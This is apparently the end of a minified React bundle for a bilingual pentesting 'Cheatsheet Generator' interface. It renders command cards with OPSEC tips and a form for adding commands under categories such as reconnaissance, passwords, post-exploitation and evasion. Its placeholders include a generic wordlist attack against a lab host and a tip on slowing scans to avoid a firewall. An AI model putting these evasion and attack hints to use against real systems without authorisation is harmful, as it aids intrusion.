font-sans",children:Ba.descripcion})]},ka))})]}),u.jsxs("div",{className:"flex flex-col gap-3",children:[u.jsxs("div",{className:"bg-slate-950 border border-slate-800/60 rounded p-3 shadow-inner",children:[u.jsx("span",{className:"font-mono text-[10px] font-bold text-slate-400 block mb-1 uppercase tracking-tight",children:x("ejemploPractico")}),u.jsx("code",{className:"block text-xs font-mono text-blue-400 select-all bg-slate-900/60 p-2.5 border border-slate-850 rounded whitespace-normal",children:m.ejemplo})]}),u.jsxs("div",{className:"bg-amber-500/5 border border-amber-500/20 p-3 rounded-md",children:[u.jsxs("div",{className:"flex items-center gap-1.5 mb-1 text-amber-500 font-bold text-xs uppercase tracking-wider",children:[u.jsx(Xh,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:x("tipOpsec")})]}),u.jsx("p",{className:"text-xs text-amber-250 leading-relaxed font-sans",children:m.tip})]})]})]})]},_)})})]})]}),u.jsxs("footer",{className:"bg-slate-950 border-t border-slate-850 h-10 fixed bottom-0 left-0 w-full z-30 flex justify-between items-center px-6 text-xs text-slate-500 font-sans",children:[u.jsxs("div",{className:"flex gap-6 items-center",children:[u.jsx("span",{className:"font-semibold text-slate-400",children:"Cheatsheet Generator"}),u.jsx("span",{className:"text-[10px] bg-slate-900 px-1.5 py-0.5 rounded text-slate-500 font-mono",children:"STABLE // SECURE"})]}),u.jsx("div",{className:"flex gap-4",children:u.jsx("span",{className:"text-slate-400 uppercase tracking-tight text-[11px] font-sans",children:"Usa con responsabilidad"})})]}),ya&&u.jsx("div",{className:"fixed inset-0 bg-black/85 flex items-center justify-center p-4 z-50 backdrop-blur-xs font-sans max-h-screen overflow-y-auto",children:u.jsxs("div",{className:"w-full max-w-2xl bg-slate-900 border border-slate-800 shadow-2xl rounded-lg overflow-hidden flex flex-col my-8",children:[u.jsxs("div",{className:"bg-slate-950 border-b border-slate-850 px-4 py-3 flex justify-between items-center",children:[u.jsxs("div",{className:"flex items-center gap-2",children:[u.jsx(Er,{className:"w-4 h-4 text-emerald-400"}),u.jsx("h3",{className:"font-mono text-sm font-bold text-white uppercase tracking-tight",children:x("modalManual_title")})]}),u.jsx("button",{onClick:()=>we(!1),className:"text-slate-400 hover:text-white hover:bg-slate-800/50 p-1.5 rounded cursor-pointer transition-all",children:u.jsx(Ff,{className:"w-4 h-4"})})]}),u.jsxs("form",{onSubmit:ql,className:"p-6 flex flex-col gap-4",children:[u.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_useCaseTitle")}),u.jsx("input",{type:"text",required:!0,placeholder:T==="es"?"ej: Enumeración de hosts vivos con NetBIOS":"e.g., Enumerating live hosts via NetBIOS",value:K,onChange:m=>He(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2 text-xs font-sans text-white focus:outline-hidden transition-all"})]}),u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_category")}),u.jsxs("div",{className:"bg-slate-950 border border-slate-850 rounded p-2 text-xs font-mono text-emerald-400/90 flex items-center justify-between",children:[u.jsx("span",{children:T==="es"?w.category:w.category==="Reconocimiento"?"Reconnaissance":w.category==="Web"?"Web Audit":w.category==="Passwords"?"Passwords / Credentials":w.category==="Post-explotación"?"Post-Exploitation":"Evasion / OPSEC"}),u.jsx("span",{className:"text-[9px] bg-emerald-500/10 border border-emerald-500/20 px-1.5 py-0.5 rounded uppercase font-bold tracking-wider",children:T==="es"?"heredado":"inherited"})]})]})]}),u.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_difficulty")}),u.jsxs("select",{value:ca,onChange:m=>ct(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2 text-xs font-sans text-white focus:outline-hidden transition-all",children:[u.jsx("option",{value:"básico",children:T==="es"?"básico":"basic"}),u.jsx("option",{value:"intermedio",children:T==="es"?"intermedio":"intermediate"}),u.jsx("option",{value:"avanzado",children:T==="es"?"avanzado":"advanced"})]})]}),u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_frequency")}),u.jsxs("select",{value:ua,onChange:m=>Qe(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2 text-xs font-sans text-white focus:outline-hidden transition-all",children:[u.jsx("option",{value:"siempre",children:T==="es"?"siempre":"always"}),u.jsx("option",{value:"común",children:T==="es"?"común":"common"}),u.jsx("option",{value:"ocasional",children:T==="es"?"ocasional":"occasional"})]})]})]}),u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_command")}),u.jsx("input",{type:"text",required:!0,placeholder:T==="es"?"ej: tool_name -u <target_url> --wordlist <wordlist_path>":"e.g., tool_name -u <target_url> --wordlist <wordlist_path>",value:Ta,onChange:m=>Ea(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2.5 text-xs font-mono text-white placeholder-slate-650 transition-all font-semibold"})]}),u.jsxs("div",{className:"flex flex-col gap-2",children:[u.jsxs("div",{className:"flex justify-between items-center border-b border-slate-800 pb-1",children:[u.jsx("span",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_flagsUsed")}),u.jsxs("button",{type:"button",onClick:Hl,className:"text-emerald-400 hover:text-emerald-300 text-xs font-mono font-bold flex items-center gap-1 cursor-pointer transition-colors",children:[u.jsx(Er,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:x("modalManual_addFile")})]})]}),u.jsx("div",{className:"flex flex-col gap-2 max-h-[140px] overflow-y-auto pr-1",children:ie.map((m,G)=>u.jsxs("div",{className:"flex gap-2 items-center",children:[u.jsx("input",{type:"text",placeholder:T==="es"?"ej: -u":"e.g., -u",value:m.flag,onChange:_=>Fi(G,"flag",_.target.value),className:"w-[120px] bg-slate-950 border border-slate-850 rounded p-1.5 text-xs font-mono text-white focus:border-emerald-500/60 focus:outline-hidden transition-all"}),u.jsx("input",{type:"text",placeholder:T==="es"?"ej: Determina la URL de destino":"e.g., Specifies the destination URL",value:m.desc,onChange:_=>Fi(G,"desc",_.target.value),className:"flex-1 bg-slate-950 border border-slate-850 rounded p-1.5 text-xs font-sans text-white focus:border-emerald-500/60 focus:outline-hidden transition-all"}),ie.length>1&&u.jsx("button",{type:"button",onClick:()=>{const _=[...ie];_.splice(G,1),oe(_)},className:"text-red-400 hover:text-red-350 text-xs shrink-0 cursor-pointer px-1 transition-colors font-semibold",children:T==="es"?"Eliminar":"Delete"})]},G))})]}),u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_realExample")}),u.jsx("input",{type:"text",placeholder:T==="es"?"ej: tool_name -u http://target.htb --wordlist /usr/share/wordlists/rockyou.txt":"e.g., tool_name -u http://target.htb --wordlist /usr/share/wordlists/rockyou.txt",value:ea,onChange:m=>y(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2 text-xs font-mono text-blue-400"})]}),u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsx("label",{className:"font-mono text-xs font-bold text-slate-400 uppercase",children:x("modalManual_opsecTip")}),u.jsx("textarea",{placeholder:T==="es"?"ej: Usa un retardo de tiempo si hay un cortafuegos agresivo...":"e.g., Use an artificial timing delay if there is an aggressive firewall on trail...",rows:2,value:N,onChange:m=>q(m.target.value),className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded p-2 text-xs font-sans text-white resize-none"})]}),u.jsxs("div",{className:"flex justify-end gap-2 border-t border-slate-850 pt-4 mt-2",children:[u.jsx("button",{type:"button",onClick:()=>we(!1),className:"px-4 py-2 bg-slate-950 hover:bg-slate-900 text-slate-400 hover:text-white border border-slate-850 font-mono text-xs rounded transition-all cursor-pointer",children:x("modalManual_cancel")}),u.jsx("button",{type:"submit",className:"px-5 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-mono font-bold text-xs rounded transition-all cursor-pointer shadow-sm shadow-emerald-600/10",children:x("modalManual_save")})]})]})]})})]})}bh.createRoot(document.getElementById("root")).render(u.jsx(ye.StrictMode,{children:u.jsx(Kh,{})}));
